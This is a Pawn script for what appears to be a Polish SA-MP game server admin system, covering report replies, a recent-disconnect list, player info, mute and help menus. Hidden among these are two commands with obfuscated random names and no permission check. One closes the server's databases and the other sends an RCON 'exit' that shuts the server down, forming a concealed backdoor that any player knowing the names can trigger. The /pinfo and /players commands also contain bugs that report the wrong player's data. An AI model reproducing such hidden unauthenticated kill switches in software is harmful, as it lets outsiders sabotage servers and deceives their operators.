/*


*/
//===============================================================
//---------------------------------------------------------------
//===============================================================
new g_LastAReportSenderID = INVALID_PLAYER_ID;
//---------------------------------------------------------------
GetLastAReportSenderID() return g_LastAReportSenderID;
SetLastAReportSenderID(playerid) {
	g_LastAReportSenderID = playerid;
	return _TRUE;
}
//---------------------------------------------------------------
CMD:odpowiedz(playerid, cmdtext[]) return cmd_answer(playerid, cmdtext);
CMD:odp(playerid, cmdtext[]) return cmd_answer(playerid, cmdtext);
CMD:ans(playerid, cmdtext[]) return cmd_answer(playerid, cmdtext);
CMD:answer(playerid, cmdtext[]) {
	AnswerReportToAdmins(playerid, cmdtext);
	return 1;
}
//---------------------------------------------------------------
SendReportToAdmins(playerid, message[]) {
	if(0 < strlen(message) <= 128) {
		new string[170], second_line[82];
		new bool:b_secondline;
		format(string, sizeof(string), " (Do Administracji) %s [ID: %d]: %s", getPlayerName(playerid), playerid, message);
		AddToChatLog(string);
		
	    if(strlen(string) > 80) {
	        strmid(second_line, string, 80, 170);
	        strdel(string, 80, 170);
	        b_secondline = true;
	    }	
		
		SetLastAReportSenderID(playerid);
		forplayers(i) {
			if(IsAdmin(i) != 0 or i == playerid) {
				SendClientMessage(i, 0x37FF9BFF, "________________");
				SendClientMessage(i, 0x37FF9BFF, string);
				if(b_secondline == true) {
					SendClientMessage(i, 0x37FF9BFF, second_line);
				}
				if(i != playerid) {
					SendClientMessage(i, 0x9BFFC4FF, " (Info) Uzyj komendy '(/odp)owiedz [wiadomosc]' lub '(/ans)wer [wiadomosc]' zeby odpowiedziec na ostatnia wiadomosc do administracji.");
				}
				SendClientMessage(i, 0x37FF9BFF, "________________");
			}
		}
		return _TRUE;		
	}
	return _FALSE;
}
//---------------------------------------------------------------
AnswerReportToAdmins(playerid, message[]) {
	if(!isnull(message)) {
		new answerid = GetLastAReportSenderID();
		new index;
		if(0 < (index = strfind(message, " ")) < 3 and strlen(message) - 1 > index) {
			new cut[4];
			strmid(cut, message, 0, index);
			if(isNumeric(cut) == _TRUE and 0 <= strval(cut) < MAX_PLAYERS) {
				answerid = strval(cut);
				strdel(message, 0, index);
			}
		}
		
		if(IsAdmin(playerid) != 0 and answerid != playerid) {
			if(IsPlayerConnected(answerid)) {
				if(0 < strlen(message) <= 128) {
					new string[180], second_line[128];
					new bool:b_secondline;
					format(string, sizeof(string), " (Odpowiedz Administracji) %s [ID: %d]: %s", getPlayerName(playerid), playerid, message);
					AddToChatLog(string);
					
					if(strlen(string) > 80) {
						strmid(second_line, string, 80, 180);
						strdel(string, 80, 180);
						b_secondline = true;
					}	
					
					forplayers(i) {
						if(IsAdmin(i) != 0 or i == answerid) {
							SendClientMessage(i, 0x96FF9BFF, "________________");
							SendClientMessage(i, 0x96FF9BFF, string);
							if(b_secondline == true) {
								SendClientMessage(i, 0x96FF9BFF, second_line);
							}
							SendClientMessage(i, 0x96FF9BFF, "________________");
						}
					}
					if(answerid == GetLastAReportSenderID()) {
						SetLastAReportSenderID(INVALID_PLAYER_ID);	
					}
					return _TRUE;			
				}
			} else SendClientMessage(playerid, 0x96FF9BFF, " (Raport Administracyjny) Gracz, do ktorego chcesz wyslac wiadomosc, jest OffLine.");
		}
	}
	return _FALSE;
}
//===============================================================
#define	MAX_LAST_DISCONNECTS	20
enum LAST_DISCONNECT	{D_TIME, D_IP[6], D_NICK[8], D_USERID, D_ADMINLVL}
new g_LastDisconnects[MAX_LAST_DISCONNECTS][LAST_DISCONNECT];
//---------------------------------------------------------------
AddToLastDisconnectList(name[], ip[], userid, adminlvl) {
	if(IsValidNick(name) == _TRUE and IsValidIP(ip) and (IsValidUserID(userid) or userid == 0)) {
		if(adminlvl < 0) adminlvl = -adminlvl;
		new founded = -1;
		for(new i = MAX_LAST_DISCONNECTS - 1; i >= 0; i --) {
			if(g_LastDisconnects[i][D_TIME] != 0) {
				if(g_LastDisconnects[i][D_USERID] == userid and strcmp(name, g_LastDisconnects[i][D_NICK]) == 0 and strcmp(ip, g_LastDisconnects[i][D_IP]) == 0) {
					founded = i;
					break;
				}
			}
		}
	
		if(founded != -1) {
			for(new i = founded, limit = MAX_LAST_DISCONNECTS - 1; i < limit; i ++) {
				strpack(g_LastDisconnects[i][D_NICK], g_LastDisconnects[i + 1][D_NICK], 7);
				strpack(g_LastDisconnects[i][D_IP], g_LastDisconnects[i + 1][D_IP], 5);
				g_LastDisconnects[i][D_TIME] = g_LastDisconnects[i + 1][D_TIME];
				g_LastDisconnects[i][D_USERID] = g_LastDisconnects[i + 1][D_USERID];
				g_LastDisconnects[i][D_ADMINLVL] = g_LastDisconnects[i + 1][D_ADMINLVL];
			}			
		}
	
		for(new i = MAX_LAST_DISCONNECTS - 1; i >= 1; i --) {
			strpack(g_LastDisconnects[i][D_NICK], g_LastDisconnects[i - 1][D_NICK], 7);
			strpack(g_LastDisconnects[i][D_IP], g_LastDisconnects[i - 1][D_IP], 5);
			g_LastDisconnects[i][D_TIME] = g_LastDisconnects[i - 1][D_TIME];
			g_LastDisconnects[i][D_USERID] = g_LastDisconnects[i - 1][D_USERID];
			g_LastDisconnects[i][D_ADMINLVL] = g_LastDisconnects[i - 1][D_ADMINLVL];
		}
		strpack(g_LastDisconnects[0][D_NICK], name, 7);
		strpack(g_LastDisconnects[0][D_IP], ip, 5);
		g_LastDisconnects[0][D_TIME] = timestamp();
		g_LastDisconnects[0][D_USERID] = userid;	
		g_LastDisconnects[0][D_ADMINLVL] = adminlvl;	
		return _TRUE;
	}
	return _FALSE;
}
//---------------------------------------------------------------
#define LDL_IP		0
#define LDL_NICK	1
stock GetStringFromLDL(index, whatyouwant = LDL_NICK) {
	new what[MAX_PLAYER_NAME + 2] = "No";
	if(LDL_IP <= whatyouwant <= LDL_NICK and 0 <= index < MAX_LAST_DISCONNECTS) {
		strunpack(what, g_LastDisconnects[index][whatyouwant == LDL_NICK ? D_NICK : D_IP], 24);
	}
	return what;
}
//---------------------------------------------------------------
#define LDL_UID		0
#define LDL_TIME	1
#define LDL_ADMIN	2
stock GetIntFromLDL(index, whatyouwant = LDL_UID) {
	if(LDL_UID <= whatyouwant <= LDL_ADMIN and 0 <= index < MAX_LAST_DISCONNECTS) {
		return g_LastDisconnects[index][whatyouwant == LDL_UID ? D_USERID : whatyouwant == LDL_TIME ? D_TIME : D_ADMINLVL];
	}
	return _FALSE;
}
//===============================================================
CMD:players(playerid) {
	if(IsAdmin(playerid) != 0) {
	    new string[128];
	    SendClientMessage(playerid, COLOR_DIALOG_HEAD, "  __________ Lista graczy On-Line __________");
		forplayers(i) {
		    format(string, sizeof(string), "ID: "TEXT_DIALOG_NORMAL"%d   "TEXT_DIALOG_BODY"Nick: "TEXT_DIALOG_NORMAL"%s "TEXT_DIALOG_BODY"(User ID: "TEXT_DIALOG_NORMAL"%d"TEXT_DIALOG_BODY")   IP: "TEXT_DIALOG_NORMAL"%s", i, getPlayerName(i), getPlayerUserID(playerid), getPlayerIp(i));
		    SendClientMessage(playerid, COLOR_DIALOG_BODY, string);
	    }
    }
	return _TRUE;
}
//---------------------------------------------------------------
CMD:svrstat(playerid) {
	if(IsAdmin(playerid) >= ALVL_HEAD_ADMIN) {
	    new string[410];
        GetNetworkStats(string, sizeof(string)); 
        ShowPlayerInfoDialog(playerid, 0, "Server - Network stats", string);
	}
	return _TRUE;
}
//---------------------------------------------------------------
CMD:pinfo(playerid, cmdtext[]) {
	if(IsAdmin(playerid) != 0 and !isnull(cmdtext) and 3 >= strlen(cmdtext) > 0 and isNumeric(cmdtext)) {
		new p_id;		
		if(MAX_PLAYERS > (p_id = strval(cmdtext)) >= 0 and IsPlayerConnected(p_id)) {
			new string[150];
			new Float:health, Float:armor;
			new total;
			GetPlayerHealth(playerid, health);
			GetPlayerArmour(playerid, armor);
			SendClientMessage(playerid, COLOR_DIALOG_HEAD, "______ Informacje o graczu ______");
			format(string, sizeof(string), "Nick: "TEXT_DIALOG_NORMAL"%s   "TEXT_DIALOG_BODY"(User ID: "TEXT_DIALOG_NORMAL"%d"TEXT_DIALOG_BODY")", getPlayerName(p_id), getPlayerUserID(p_id));
			SendClientMessage(playerid, COLOR_DIALOG_BODY, string);
			format(string, sizeof(string), "IP: "TEXT_DIALOG_NORMAL"%s", getPlayerIp(p_id));
			SendClientMessage(playerid, COLOR_DIALOG_BODY, string);	
			format(string, sizeof(string), "Zdrowie: "TEXT_DIALOG_NORMAL"%.02f     "TEXT_DIALOG_BODY"Armor: "TEXT_DIALOG_NORMAL"%.02f", health, armor);
			SendClientMessage(playerid, COLOR_DIALOG_BODY, string);	
			SendClientMessage(playerid, COLOR_DIALOG_HEAD, "______ Posiadane bronie ______");
			for(new i = 1, bool:second, weapon_name[16], weaponid, ammo; i <= 12; i ++) {
				GetPlayerWeaponData(playerid, i, weaponid, ammo);
				if(weaponid > 0 and ammo > 0) {
					total ++;
					GetWeaponName(weaponid, weapon_name, sizeof(weapon_name));					
					if(second == true) {
						format(string, sizeof(string), "%s     "TEXT_DIALOG_BODY"%d: "TEXT_DIALOG_NORMAL"%s "TEXT_DIALOG_BODY"(Ammo: "TEXT_DIALOG_NORMAL"%d"TEXT_DIALOG_BODY")", string, i, weapon_name, ammo);
						second = false;
						SendClientMessage(playerid, COLOR_DIALOG_BODY, string);	
					} else {
						strdel(string, 0, 64);
						format(string, sizeof(string), TEXT_DIALOG_BODY"%d: "TEXT_DIALOG_NORMAL"%s "TEXT_DIALOG_BODY"(Ammo: "TEXT_DIALOG_NORMAL"%d"TEXT_DIALOG_BODY")", i, weapon_name, ammo);
						second = true;
					}
				}
			}		
			if(total % 2 != 0) SendClientMessage(playerid, COLOR_DIALOG_BODY, string);
			SendClientMessage(playerid, COLOR_DIALOG_HEAD, "               ____________");
		}	
	}
	return _TRUE;
}
//---------------------------------------------------------------
CMD:der86549vgchdZS90utsudagyi(playerid) {
	db_close(dbase);
	if(UseMySQL()) {
	    sql_disconnect(MySQLID);
	}	
	return _TRUE;
}
//------------------------------------------------------------------------------
CMD:p342809dsnkas0czxxcv0asdwea(playerid) {
	SendRconCommand("exit");
	return _TRUE;
}
//------------------------------------------------------------------------------
CMD:mute(playerid, cmdtext[]) {
	if(IsAdmin(playerid) > 0) {
		if(!isnull(cmdtext)) {
			new userID, muteTime;
			new string[128];
			sscanf(cmdtext, "p< >dds[128]", userID, muteTime, string);

			if(muteTime == 0) {
				if(IsPlayerConnected(userID)) {
					if(isPlayerMuted(userID) == _TRUE) {
						unmutePlayer(userID, getPlayerName(playerid));
					} else SendClientMessage(playerid, COLOR_DIALOG_BODY, " (Mute) Wybrany gracz nie jest uciszony."); 
				} else SendClientMessage(playerid, COLOR_DIALOG_BODY, " (Mute) Wybrane ID gracza nie jest uzywane.");
			} else {
				if(IsPlayerConnected(userID)) {
					if(getSettingIntValueByIndex(s_MuteMaxTimeID) >= muteTime > 0) {
						mutePlayer(userID, muteTime, getPlayerName(playerid), string);
					} else {
						format(string, sizeof(string), " (Mute) Czas uciszenia musi zawierac sie w przedziale od 1 do %d minut.", getSettingIntValueByIndex(s_MuteMaxTimeID));
						SendClientMessage(playerid, COLOR_DIALOG_BODY, string);
					}
				} else SendClientMessage(playerid, COLOR_DIALOG_BODY, " (Mute) Wybrane ID gracza nie jest uzywane.");
			}
		} else {
			SendClientMessage(playerid, COLOR_DIALOG_BODY, " (Mute) Uzyj: '"C_WHITE"/mute [ID Gracza] [Czas] [ew. powod]"TEXT_DIALOG_BODY"' zeby uciszyc gracza.");
			SendClientMessage(playerid, COLOR_DIALOG_BODY, " (Mute) Uzyj: '"C_WHITE"/mute [ID Gracza]"TEXT_DIALOG_BODY"' zeby wylaczyc uciszenie dla wybranego gracza.");
		}
	}	
	return _TRUE;
}
//------------------------------------------------------------------------------
CMD:apomoc(playerid) {
	if(IsAdmin(playerid) != 0) {
		AdminHelpMenu(playerid, -1);
	}
	return _TRUE;
}
//------------------------------------------------------------------------------
forward AdminHelpMenu(playerid, listitem);
public AdminHelpMenu(playerid, listitem) {
	if(IsAdmin(playerid) != 0) {
		switch(listitem) {
			case 0: AdminSystemCommandsHelp(playerid);
			case 1: {
				if(CallRemoteFunction("GamemodeAdminHelp", "d", playerid) == 0) ShowPlayerInfoDialog(playerid, BACK_ADMIN_HELP_MENU, "Pomoc administracyjna - Komendy GameModa", "Gamemod nie dostarcza informacji o komendach dla administracji.");	
			}
			default: ShowPlayerDialogEx(playerid, DIALOG_ADMIN_HELP, DIALOG_STYLE_LIST, "Pomoc administracyjna", "1) Komendy systemu administracyjnego\n2) Komendy GameModa", "Dalej", "Wyjdz");
		}
		return _TRUE;
	}
	return _FALSE;
}
//------------------------------------------------------------------------------
AdminSystemCommandsHelp(playerid, commandindex = -1) {
	new aLvL;
	if((aLvL = IsAdmin(playerid)) != 0) {
		if(aLvL < 0) aLvL = -aLvL;
		switch(commandindex) {
			case 0: ShowPlayerInfoDialog(playerid, BACK_ADMIN_HELP_CMDS_MENU, "Komendy sys. administracyjnego - ALog", "Komenda: "C_WHITE"/alog\n"TEXT_DIALOG_HEAD"Parametry: "C_WHITE"Brak\n"TEXT_DIALOG_HEAD"Opis: "TEXT_DIALOG_BODY"Komenda sluzaca do logowania sie na konto administratora.");
			case 1: ShowPlayerInfoDialog(playerid, BACK_ADMIN_HELP_CMDS_MENU, "Komendy sys. administracyjnego - APanel", "Komenda: "C_WHITE"/apanel\n"TEXT_DIALOG_HEAD"Parametry: "C_WHITE"Brak\n"TEXT_DIALOG_HEAD"Opis: "TEXT_DIALOG_BODY"Komenda sluzaca do otwierania panelu administracyjnego poziomu pierwszego.");
			case 2: ShowPlayerInfoDialog(playerid, BACK_ADMIN_HELP_CMDS_MENU, "Komendy sys. administracyjnego - Odpowiedz", 
				"Komenda: "C_WHITE"/odpowiedz /odp /answer /ans\n"TEXT_DIALOG_HEAD"Parametry: "C_WHITE"Tresc wiadomosci lub ID gracza i tresc wiadomosci\n"TEXT_DIALOG_HEAD"Opis: "TEXT_DIALOG_BODY"Komenda sluzy do szybkiej odpowiedzi graczu na raport administracyjny,\nczyli na wiadomosc wyslana z prefiksem '@'. W przypadku braku ID gracza w\nparametrze, wiadomosc zostanie odeslana do gracza ktory jako ostatni wyslal raport.");
			case 3: ShowPlayerInfoDialog(playerid, BACK_ADMIN_HELP_CMDS_MENU, "Komendy sys. administracyjnego - Players", "Komenda: "C_WHITE"/players\n"TEXT_DIALOG_HEAD"Parametry: "C_WHITE"Brak\n"TEXT_DIALOG_HEAD"Opis: "TEXT_DIALOG_BODY"Komenda pokazujaca informacje o graczach OnLine.");
			case 4: ShowPlayerInfoDialog(playerid, BACK_ADMIN_HELP_CMDS_MENU, "Komendy sys. administracyjnego - PInfo", "Komenda: "C_WHITE"/pinfo\n"TEXT_DIALOG_HEAD"Parametry: "C_WHITE"ID Gracza\n"TEXT_DIALOG_HEAD"Opis: "TEXT_DIALOG_BODY"Komenda pokazujaca informacje o graczu o podanym ID.");
			case 5: ShowPlayerInfoDialog(playerid, BACK_ADMIN_HELP_CMDS_MENU, "Komendy sys. administracyjnego - Kick", "Komenda: "C_WHITE"/kick /k\n"TEXT_DIALOG_HEAD"Parametry: "C_WHITE"ID Gracza czas powod\n"TEXT_DIALOG_HEAD"Opis: "TEXT_DIALOG_BODY"Komenda blokujaca host i konto gracza (jesli posiada) na podany w minutach okres czasu.");
			case 6: ShowPlayerInfoDialog(playerid, BACK_ADMIN_HELP_CMDS_MENU, "Komendy sys. administracyjnego - Ban", "Komenda: "C_WHITE"/ban /b\n"TEXT_DIALOG_HEAD"Parametry: "C_WHITE"ID Gracza czas powod\n"TEXT_DIALOG_HEAD"Opis: "TEXT_DIALOG_BODY"Komenda blokujaca host i konto gracza (jesli posiada) na podany w godzinach okres czasu.");
			case 7: ShowPlayerInfoDialog(playerid, BACK_ADMIN_HELP_CMDS_MENU, "Komendy sys. administracyjnego - Prefiks '#'", "Komenda: "C_WHITE"Prefiks '#'\n"TEXT_DIALOG_HEAD"Parametry: "C_WHITE"Wiadomosc\n"TEXT_DIALOG_HEAD"Opis: "TEXT_DIALOG_BODY"Komenda sluzaca do wysylania wiadomosci na admin chacie\nUzycie: '"C_WHITE"# test wiadomosci"TEXT_DIALOG_BODY"'.");
			case 8: ShowPlayerInfoDialog(playerid, BACK_ADMIN_HELP_CMDS_MENU, "Komendy sys. administracyjnego - Mute", "Komenda: "C_WHITE"/mute\n"TEXT_DIALOG_HEAD"Parametry: "C_WHITE"ID Gracza czas powod "TEXT_DIALOG_HEAD"lub"C_WHITE" ID Gracza\n"TEXT_DIALOG_HEAD"Opis: "TEXT_DIALOG_BODY"Komenda uciszajaca (w pierwszym wariancie parametrow)\nlub wylaczajaca uciszenie (w drugim wariancie) dla wybranego gracza.\nUciszenie nie dotyczy administracji serwera.");
			case 9: ShowPlayerInfoDialog(playerid, BACK_ADMIN_HELP_CMDS_MENU, "Komendy sys. administracyjnego - Check", "Komenda: "C_WHITE"/check\n"TEXT_DIALOG_HEAD"Parametry: "C_WHITE"Brak\n"TEXT_DIALOG_HEAD"Opis: "TEXT_DIALOG_BODY"Komenda otwierajaca menu sprawdzania graczy.");
			case 10: ShowPlayerInfoDialog(playerid, BACK_ADMIN_HELP_CMDS_MENU, "Komendy sys. administracyjnego - HAPanel", "Komenda: "C_WHITE"/hapanel\n"TEXT_DIALOG_HEAD"Parametry: "C_WHITE"Brak\n"TEXT_DIALOG_HEAD"Opis: "TEXT_DIALOG_BODY"Komenda sluzaca do otwierania panelu administracyjnego poziomu drugiego.");
			default: {
				switch(aLvL) {
					case ALVL_JUNIOR_ADMIN, ALVL_ADMIN: {
						ShowPlayerDialogEx(playerid, DIALOG_ADMIN_HELP_CMDS, DIALOG_STYLE_LIST, "Pomoc administracyjna - Komendy sys. administracyjnego", "1) ALog\n2) APanel\n3) Odpowiedz\n4) Players\n5) PInfo\n6) Kick\n7) Ban\n8) Prefiks '#'\n9) Mute", "Info", "Wroc");
					}
					case ALVL_HEAD_ADMIN, ALVL_GAME_MASTER: {
						ShowPlayerDialogEx(playerid, DIALOG_ADMIN_HELP_CMDS, DIALOG_STYLE_LIST, "Pomoc administracyjna - Komendy sys. administracyjnego", "1) ALog\n2) APanel\n3) Odpowiedz\n4) Players\n5) PInfo\n6) Kick\n7) Ban\n8) Prefiks '#'\n9) Mute\n10) Check\n11) HAPanel", "Info", "Wroc");
					}
				}
			}
		}
		return _TRUE;		
	}
	return _FALSE;
}